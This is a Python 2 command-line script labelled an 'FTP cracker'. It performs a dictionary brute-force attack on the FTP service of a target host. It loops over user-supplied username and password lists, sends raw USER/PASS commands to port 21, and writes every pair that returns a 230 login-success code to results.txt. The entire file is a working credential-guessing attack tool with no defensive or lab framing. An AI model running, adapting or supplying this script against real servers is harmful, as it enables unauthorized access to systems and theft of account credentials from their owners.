#!/usr/bin/python

import socket
import sys
import time

class PC:
        HEADER='\033[95m'
        OKBLUE='\033[94m'
        OKCYAN='\033[96m'
        OKGREEAN='\033[92m'
        WARNING='\033[93m'
        FAIL='\033[91m'
        ENDC='\033[0m'
        BOLD='\033[1m'
        UNDERLINE='\033[4m'


def FILES_CHK(Users,Passwords):
	try:
		U=open(Users,'r')
	except:
		print "%s[*] %s%sERROR%s%s : Usernames File Is Not Exists Or Its Unreadable For You%s" % (PC.OKCYAN,PC.BOLD,PC.FAIL,PC.ENDC,PC.WARNING,PC.ENDC)
		exit(0)
	try:
		P=open(Passwords,'r')
	except:
		print "%s[*] %s%sERROR%s%s : Passwords File Is Not Exists Or Its Unreadable For You%s" % (PC.OKCYAN,PC.BOLD,PC.FAIL,PC.ENDC,PC.WARNING,PC.ENDC)
		exit(0)
	usr=U.readlines()
	pwd=P.readlines()
	return usr,pwd

def BRUTE(host,usr,pwd):
	port=21
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print "%s[*] Banner :%s %s %s" % (PC.OKCYAN,PC.WARNING,s.recv(1024),PC.ENDC)
	s.close()
	new=open("results.txt","w+")
	for U in usr:
		for P in pwd:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((host,port))
			s.recv(1024)
			s.send("USER "+ U + "\r\n")
			s.recv(1024)
			s.send("PASS "+ P + "\r\n")
			result=s.recv(1024)
			if "230" in result:
				print "%s[+]%s %s%s| %s%s:%s%s" % (PC.OKCYAN,PC.ENDC,PC.OKGREEAN,result.rstrip(),PC.BOLD,U.rstrip(),P.rstrip(),PC.ENDC)
				new.write(U.rstrip()+":"+P.rstrip()+"\r\n")
			else:
				print "%s[-]%s%s %s | %s%s:%s%s" % (PC.HEADER,PC.ENDC,PC.FAIL,result.rstrip(),PC.BOLD,U.rstrip(),P.rstrip(),PC.ENDC)
			s.close()
			
			
if len(sys.argv) != 4:
	print "USAGE : %s  <Host>  <Users-List> <Pass-List>" % (sys.argv[0])
else:
	print "%s[*]%s %sSTART FTP cracker Script %s" % (PC.OKCYAN,PC.ENDC,PC.OKBLUE,PC.ENDC)
	print "%s[*] TARGET : FTP service on host%s <%s>%s" % (PC.OKCYAN,PC.WARNING,sys.argv[1],PC.ENDC)
	user,paswd = FILES_CHK(sys.argv[2],sys.argv[3])
	BRUTE(sys.argv[1],user,paswd)
	print ""
	print "%s[*]%s %sFINISHED %s" % (PC.OKCYAN,PC.ENDC,PC.OKBLUE,PC.ENDC)
